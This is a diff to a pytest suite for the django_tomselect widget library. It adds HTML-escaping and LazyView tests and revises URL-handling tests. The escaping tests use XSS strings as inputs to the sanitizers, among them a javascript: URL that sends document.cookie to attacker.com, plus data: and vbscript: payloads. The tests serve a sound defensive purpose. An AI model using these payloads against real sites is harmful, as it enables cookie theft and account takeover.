@@ -1,6 +1,5 @@
 """Tests for TomSelectModelWidget and TomSelectModelMultipleWidget."""
 
-import hashlib
 import logging
 import time
 from dataclasses import FrozenInstanceError
@@ -25,7 +24,9 @@ from django_tomselect.app_settings import (
     bool_or_callable,
     merge_configs,
 )
+from django_tomselect.autocompletes import AutocompleteModelView
 from django_tomselect.cache import permission_cache
+from django_tomselect.lazy_utils import LazyView
 from django_tomselect.widgets import (
     TomSelectIterablesMultipleWidget,
     TomSelectIterablesWidget,
@@ -615,7 +616,7 @@ class TestWidgetQuerysetAndDependencies:
         widget = setup_dependent_widget
         widget.get_autocomplete_view = lambda: None
         params = widget.get_autocomplete_params()
-        assert params == []
+        assert params == ""
 
     def test_get_model_from_choices_model(self):
         """Test get_model when choices has model attribute."""
@@ -892,8 +893,12 @@ class TestWidgetValidation:
 
     def test_url_validation(self):
         """Test URL validation during widget initialization."""
+        from django.urls.exceptions import NoReverseMatch
+
         widget = TomSelectIterablesWidget(config=TomSelectConfig(url=""))
-        assert widget.get_autocomplete_url() == ""
+
+        with pytest.raises(NoReverseMatch):
+            widget.get_autocomplete_url()
 
     def test_url_with_parameters(self):
         """Test URL generation with parameters."""
@@ -1401,10 +1406,6 @@ class TestWidgetValidationAndPermissions:
         context = widget.get_permissions_context(view)
         assert context["can_view"] is True
 
-        # Build cache key using the permission_cache's actual method
-        unique_key = f"tomselect_perm:{mock_request.user.id}:edition:view:v1"
-        cache_key = hashlib.md5(unique_key.encode()).hexdigest()
-
         # Set the permission directly using the permission_cache method
         permission_cache.set_permission(user_id=mock_request.user.id, model_name="edition", action="view", value=True)
 
@@ -1812,69 +1813,6 @@ class TestLabelFieldInValueFields:
 
         return MockAutocompleteView
 
-    def test_label_field_not_in_value_fields(self, setup_custom_widget, mock_autocomplete_view, monkeypatch, caplog):
-        """Test that widget adds label_field to value_fields if missing."""
-        widget = setup_custom_widget(label_field="custom_field")
-
-        # Create a mock view with value_fields that doesn't include the label_field
-        mock_view = mock_autocomplete_view(value_fields=["id", "name"])
-
-        # Mock the resolve function to return our mock view
-        class MockResolver:
-            def __init__(self):
-                self.func = type("MockFunc", (), {"view_class": lambda: mock_view})
-
-        def mock_resolve(url):
-            return MockResolver()
-
-        monkeypatch.setattr("django_tomselect.widgets.resolve", mock_resolve)
-
-        # Mock the get_model method to return Edition
-        monkeypatch.setattr(widget, "get_model", lambda: Edition)
-
-        # Call get_autocomplete_view to trigger the validation
-        view = widget.get_autocomplete_view()
-
-        # Check that label_field was added to value_fields
-        assert "custom_field" in view.value_fields
-
-        # Verify a warning was logged
-        assert "Label field 'custom_field' is not in the autocomplete view's value_fields" in caplog.text
-
-    def test_label_field_already_in_value_fields(
-        self, setup_custom_widget, mock_autocomplete_view, monkeypatch, caplog
-    ):
-        """Test that no changes are made when label_field is already in value_fields."""
-        widget = setup_custom_widget(label_field="name")
-
-        # Create a mock view with value_fields already including the label_field
-        mock_view = mock_autocomplete_view(value_fields=["id", "name"])
-
-        # Mock the resolve function to return our mock view
-        class MockResolver:
-            def __init__(self):
-                self.func = type("MockFunc", (), {"view_class": lambda: mock_view})
-
-        def mock_resolve(url):
-            return MockResolver()
-
-        monkeypatch.setattr("django_tomselect.widgets.resolve", mock_resolve)
-
-        # Mock the get_model method to return Edition
-        monkeypatch.setattr(widget, "get_model", lambda: Edition)
-
-        # Get initial value_fields
-        initial_value_fields = mock_view.value_fields.copy()
-
-        # Call get_autocomplete_view to trigger the validation
-        view = widget.get_autocomplete_view()
-
-        # Check that value_fields remains unchanged
-        assert view.value_fields == initial_value_fields
-
-        # Verify no warning was logged
-        assert "is not in the autocomplete view's value_fields" not in caplog.text
-
     def test_basic_validation_behavior(self, monkeypatch):
         """Test the basic behavior of the label_field validation in isolation."""
         # This test directly tests the conditional logic in get_autocomplete_view
@@ -2063,3 +2001,450 @@ class TestWidgetSecurity:
         assert 'input onkeyup="' not in rendered
         assert 'input onchange="' not in rendered
         assert 'input onfocus="' not in rendered
+
+
+@pytest.mark.django_db
+class TestWidgetEscaping:
+    """Tests for proper HTML escaping in TomSelect widgets."""
+
+    @pytest.fixture
+    def html_content_edition(self):
+        """Create an edition with HTML content in name field."""
+        edition = Edition.objects.create(
+            name='Test <b>Bold</b> & <script>alert("XSS")</script>', year="Year with <span>HTML</span>", pages=100
+        )
+        yield edition
+        edition.delete()
+
+    @pytest.fixture
+    def mock_request(self):
+        """Create a mock request with all needed attributes."""
+
+        class MockUser:
+            is_authenticated = True
+            id = 1
+
+            def has_perms(self, perms):
+                return True
+
+        class MockRequest:
+            user = MockUser()
+            method = "GET"
+            GET = {}
+
+            def get_full_path(self):
+                return "/test/"
+
+        return MockRequest()
+
+    def test_option_template_escaping(self):
+        """Test that HTML is properly escaped in the option template."""
+        from django.template import Context, Template
+
+        html_data = {"name": 'Option with <b>HTML</b> & <script>alert("XSS")</script>', "id": 1}
+
+        # Create template that mimics the option.html template
+        template_content = """
+        {% include "django_tomselect/helpers/decode_if_needed.html" %}
+
+        {% if widget.is_tabular %}
+            <div class="row" role="row">
+            {% if widget.plugins.dropdown_header.show_value_field %}
+                <div class="col" role="gridcell">${escape(data[this.settings.valueField])}</div>
+                <div class="col" role="gridcell">${escape(data[this.settings.labelField])}</div>
+            {% else %}
+                <div class="col" role="gridcell">${escape(data[this.settings.labelField])}</div>
+            {% endif %}
+            </div>
+        {% else %}
+            {% comment %} Here we would use escape function in JavaScript {% endcomment %}
+            <div role="option">${escape(decodeIfNeeded(data.name))}</div>
+        {% endif %}
+        """
+
+        # Create minimal context with potentially unsafe data
+        context = Context(
+            {
+                "widget": {
+                    "is_tabular": False,
+                    "plugins": {
+                        "dropdown_header": {
+                            "show_value_field": False,
+                        }
+                    },
+                },
+                "data": html_data,
+            }
+        )
+
+        template = Template(template_content)
+        rendered = template.render(context)
+
+        # Verify the template uses proper escaping syntax
+        assert "${escape(" in rendered
+        assert "decodeIfNeeded(" in rendered
+
+    def test_url_escaping_in_templates(self):
+        """Test that URLs with JavaScript are properly sanitized in templates."""
+        from django_tomselect.utils import safe_url
+
+        # Test various potentially unsafe URLs
+        unsafe_urls = [
+            "javascript:alert('XSS')",
+            "javascript:void(document.location='https://attacker.com?cookie='+document.cookie)",
+            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+            "vbscript:alert(document.domain)",
+        ]
+
+        for url in unsafe_urls:
+            result = safe_url(url)
+            # URLs should either be None or properly sanitized
+            assert result is None or "javascript:" not in result
+
+    def test_get_label_for_object(self, html_content_edition):
+        """Test that get_label_for_object properly escapes HTML."""
+        widget = TomSelectModelWidget(
+            config=TomSelectConfig(url="autocomplete-edition", value_field="id", label_field="name")
+        )
+
+        # Create a minimal mock autocomplete view
+        class MockView:
+            pass
+
+        label = widget.get_label_for_object(html_content_edition, MockView())
+
+        # Verify HTML is properly escaped
+        assert "&lt;b&gt;Bold&lt;/b&gt;" in label
+        assert "&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;" in label  # Fixed: &quot; instead of "
+        assert "&amp;lt;" not in label  # Ensure no double escaping
+
+    def test_safe_escape_utility(self, html_content_edition):
+        """Test that the safe_escape utility properly escapes HTML."""
+        from django_tomselect.utils import safe_escape
+
+        html_value = html_content_edition.name
+        escaped = safe_escape(html_value)
+
+        # Verify HTML is properly escaped
+        assert "&lt;b&gt;Bold&lt;/b&gt;" in escaped
+        assert "&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;" in escaped  # Fixed: &quot; instead of "
+        assert "&amp;lt;" not in escaped  # Ensure no double escaping
+
+    def test_sanitize_dict_escaping(self, html_content_edition):
+        """Test that sanitize_dict properly escapes HTML in dictionary values."""
+        from django_tomselect.utils import sanitize_dict
+
+        data = {
+            "name": html_content_edition.name,
+            "details": f"<div>Details about {html_content_edition.name}</div>",
+            "nested": {"html_content": '<script>alert("Nested")</script>'},
+        }
+
+        sanitized = sanitize_dict(data)
+
+        # Verify HTML is properly escaped in all levels
+        assert "&lt;b&gt;Bold&lt;/b&gt;" in sanitized["name"]
+        assert "&lt;div&gt;Details about" in sanitized["details"]
+        assert (
+            "&lt;script&gt;alert(&quot;Nested&quot;)&lt;/script&gt;" in sanitized["nested"]["html_content"]
+        )  # Fixed: &quot; instead of "
+        assert "&amp;lt;" not in sanitized["name"]  # Ensure no double escaping
+
+    def test_dropdown_header_template_escaping(self):
+        """Test that HTML in dropdown headers is properly escaped in the template."""
+        from django.template import Context, Template
+
+        # Create minimal context with potentially unsafe header content
+        context = Context(
+            {
+                "widget": {
+                    "plugins": {
+                        "dropdown_header": {
+                            "title": "Header with <b>HTML</b>",
+                            "value_field_label": 'ID with <script>alert("XSS")</script>',
+                            "label_field_label": "Name with <i>HTML</i>",
+                            "header_class": "header-class",
+                            "title_row_class": "row",
+                            "extra_headers": ["Year with <u>HTML</u>"],
+                            "extra_values": ["year"],
+                        }
+                    }
+                }
+            }
+        )
+
+        # Load the actual dropdown_header template used by the widget
+        template_content = """
+        {% load i18n %}
+
+        <div class="{{ widget.plugins.dropdown_header.header_class }}"
+            title="{{ widget.plugins.dropdown_header.title|escapejs }}" role="row">
+            <div class="{{ widget.plugins.dropdown_header.title_row_class }}">
+                <div class="col">
+                    <span role="columnheader">{{ widget.plugins.dropdown_header.value_field_label|escapejs }}</span>
+                </div>
+                <div class="col">
+                    <span role="columnheader">{{ widget.plugins.dropdown_header.label_field_label|escapejs }}</span>
+                </div>
+                {% for header_text in widget.plugins.dropdown_header.extra_headers %}
+                <div class="col">
+                    <span role="columnheader">{{ header_text|escapejs }}</span>
+                </div>
+                {% endfor %}
+            </div>
+        </div>
+        """
+
+        template = Template(template_content)
+        rendered = template.render(context)
+
+        # Check that HTML in headers is properly escaped
+        assert 'title="Header with \\u003Cb\\u003EHTML\\u003C/b\\u003E"' in rendered
+        assert "ID with \\u003Cscript\\u003Ealert(\\u0022XSS\\u0022)\\u003C/script\\u003E" in rendered
+        assert "Name with \\u003Ci\\u003EHTML\\u003C/i\\u003E" in rendered
+        assert "Year with \\u003Cu\\u003EHTML\\u003C/u\\u003E" in rendered
+
+
+@pytest.mark.django_db
+class TestLazyViewInWidgets:
+    """Tests for LazyView usage in TomSelect widgets."""
+
+    @pytest.fixture(autouse=True)
+    def setup_test(self):
+        """Set up test environment."""
+        self.basic_config = TomSelectConfig(
+            url="autocomplete-edition",
+            value_field="id",
+            label_field="name",
+        )
+        self.edition_model_widget = TomSelectModelWidget(config=self.basic_config)
+        self.iterables_widget = TomSelectIterablesWidget(config=self.basic_config)
+
+    def test_get_lazy_view_model_widget(self):
+        """Test that get_lazy_view returns a LazyView instance for model widget."""
+        lazy_view = self.edition_model_widget.get_lazy_view()
+
+        assert isinstance(lazy_view, LazyView)
+        assert lazy_view.url_name == "autocomplete-edition"
+
+    def test_get_lazy_view_iterables_widget(self):
+        """Test that get_lazy_view returns a LazyView instance for iterables widget."""
+        lazy_view = self.iterables_widget.get_lazy_view()
+
+        assert isinstance(lazy_view, LazyView)
+        assert lazy_view.url_name == "autocomplete-edition"
+
+    def test_get_autocomplete_url_from_lazy_view(self):
+        """Test that get_autocomplete_url uses the LazyView to get the URL."""
+        url = self.edition_model_widget.get_autocomplete_url()
+        expected_url = reverse_lazy("autocomplete-edition")
+
+        assert url == expected_url
+
+    def test_lazy_view_caching(self):
+        """Test that the LazyView instance is cached."""
+        # Get the LazyView instance twice
+        lazy_view1 = self.edition_model_widget.get_lazy_view()
+        lazy_view2 = self.edition_model_widget.get_lazy_view()
+
+        # They should be the same instance
+        assert lazy_view1 is lazy_view2
+
+    def test_get_queryset_from_lazy_view(self, monkeypatch):
+        """Test that get_queryset uses the LazyView to get the queryset."""
+        # Create a mock queryset
+        mock_queryset = Edition.objects.all()
+
+        # Create a mock lazy_view that returns a view with our mock queryset
+        class MockLazyView(LazyView):
+            """Mock LazyView that returns a view with our mock queryset."""
+
+            def get_queryset(self):
+                """Return the mock queryset."""
+                return mock_queryset
+
+        # Patch the get_lazy_view method to return our mock lazy_view
+        monkeypatch.setattr(self.edition_model_widget, "get_lazy_view", lambda: MockLazyView("autocomplete-edition"))
+
+        # Get the queryset and check it's our mock queryset
+        queryset = self.edition_model_widget.get_queryset()
+        assert queryset is mock_queryset
+
+    def test_invalid_url_in_lazy_view(self, monkeypatch):
+        """Test handling of invalid URL in LazyView."""
+
+        # Create a mock lazy_view that raises NoReverseMatch
+        class MockLazyView(LazyView):
+            """Mock LazyView that raises NoReverseMatch."""
+
+            def get_url(self):
+                """Raise NoReverseMatch."""
+                raise NoReverseMatch("Test error")
+
+        # Patch the get_lazy_view method to return our mock lazy_view
+        monkeypatch.setattr(self.edition_model_widget, "get_lazy_view", lambda: MockLazyView("invalid-url"))
+
+        # Check that get_autocomplete_url raises NoReverseMatch
+        with pytest.raises(NoReverseMatch):
+            self.edition_model_widget.get_autocomplete_url()
+
+    def test_multiple_widget_with_lazy_view(self):
+        """Test that multiple widgets also use LazyView correctly."""
+        multiple_widget = TomSelectModelMultipleWidget(config=self.basic_config)
+        lazy_view = multiple_widget.get_lazy_view()
+
+        assert isinstance(lazy_view, LazyView)
+        assert lazy_view.url_name == "autocomplete-edition"
+
+    def test_get_autocomplete_view_from_lazy_view(self, monkeypatch):
+        """Test that get_autocomplete_view uses the LazyView to get the view."""
+
+        # Create a mock view class that inherits from AutocompleteModelView
+        class MockView(AutocompleteModelView):
+            """Mock view for testing."""
+
+            value_fields = ["id", "name"]
+            model = Edition
+            search_lookups = []
+
+            def setup(self, request, *args, **kwargs):
+                """Mock setup method."""
+                super().setup(request, *args, **kwargs)
+
+            def get_queryset(self):
+                """Mock get_queryset method."""
+                return Edition.objects.all()
+
+        # Create a mock lazy_view that returns our mock view
+        class MockLazyView(LazyView):
+            """Mock LazyView that returns our mock view."""
+
+            def get_view(self):
+                """Return the mock view."""
+                return MockView()
+
+            def get_model(self):
+                """Return the Edition model."""
+                return Edition
+
+        # Patch the get_lazy_view method to return our mock lazy_view
+        monkeypatch.setattr(self.edition_model_widget, "get_lazy_view", lambda: MockLazyView("autocomplete-edition"))
+
+        # Get the view and check it's our mock view
+        view = self.edition_model_widget.get_autocomplete_view()
+        assert isinstance(view, MockView)
+
+    def test_get_model_from_lazy_view(self, monkeypatch):
+        """Test that get_model uses the LazyView to get the model."""
+
+        # Directly set the model on the choices object
+        class MockChoices:
+            """Mock choices with the Edition model."""
+
+            model = Edition
+
+        # Create a widget with mock choices
+        widget = TomSelectModelWidget(config=self.basic_config)
+        widget.choices = MockChoices()
+
+        # Get the model and check it's our Edition model
+        model = widget.get_model()
+        assert model is Edition
+
+    def test_label_field_added_to_value_fields(self, monkeypatch):
+        """Test that the label_field is added to the view's value_fields."""
+
+        # Create a mock view with value_fields that inherits from AutocompleteModelView
+        class MockView(AutocompleteModelView):
+            """Mock view with value_fields."""
+
+            value_fields = ["id"]
+            virtual_fields = []
+            model = Edition
+            search_lookups = []
+
+            def setup(self, request, *args, **kwargs):
+                """Mock setup method."""
+                super().setup(request, *args, **kwargs)
+
+            def get_queryset(self):
+                """Mock get_queryset method."""
+                return Edition.objects.all()
+
+        # Create a mock lazy_view that returns our mock view
+        class MockLazyView(LazyView):
+            """Mock LazyView that returns our mock view."""
+
+            def get_view(self):
+                """Return the mock view."""
+                return MockView()
+
+            def get_model(self):
+                """Return the Edition model."""
+                return Edition
+
+        # Create a widget with a different label_field
+        custom_config = TomSelectConfig(
+            url="autocomplete-edition",
+            value_field="id",
+            label_field="custom_field",  # Not in value_fields
+        )
+        widget = TomSelectModelWidget(config=custom_config)
+
+        # Patch the get_lazy_view method to return our mock lazy_view
+        monkeypatch.setattr(widget, "get_lazy_view", lambda: MockLazyView("autocomplete-edition"))
+
+        # Get the view
+        view = widget.get_autocomplete_view()
+
+        # Check that the label_field was added to value_fields
+        assert "custom_field" in view.value_fields
+
+    def test_virtual_fields_for_nonexistent_label_field(self, monkeypatch):
+        """Test that nonexistent label fields are added to virtual_fields."""
+
+        # Create a mock view with value_fields that inherits from AutocompleteModelView
+        class MockView(AutocompleteModelView):
+            """Mock view with value_fields."""
+
+            value_fields = ["id"]
+            virtual_fields = []
+            model = Edition
+            search_lookups = []
+
+            def setup(self, request, *args, **kwargs):
+                """Mock setup method."""
+                super().setup(request, *args, **kwargs)
+
+            def get_queryset(self):
+                """Mock get_queryset method."""
+                return Edition.objects.all()
+
+        # Create a mock lazy_view that returns our mock view and the Edition model
+        class MockLazyView(LazyView):
+            """Mock LazyView that returns our mock view and model."""
+
+            def get_view(self):
+                """Return the mock view."""
+                return MockView()
+
+            def get_model(self):
+                """Return the Edition model."""
+                return Edition
+
+        # Create a widget with a nonexistent label_field
+        custom_config = TomSelectConfig(
+            url="autocomplete-edition",
+            value_field="id",
+            label_field="nonexistent_field",  # Doesn't exist in Edition model
+        )
+        widget = TomSelectModelWidget(config=custom_config)
+
+        # Patch the get_lazy_view method to return our mock lazy_view
+        monkeypatch.setattr(widget, "get_lazy_view", lambda: MockLazyView("autocomplete-edition"))
+
+        # Get the view
+        view = widget.get_autocomplete_view()
+
+        # Check that the nonexistent label_field was added to virtual_fields
+        assert "nonexistent_field" in view.virtual_fields
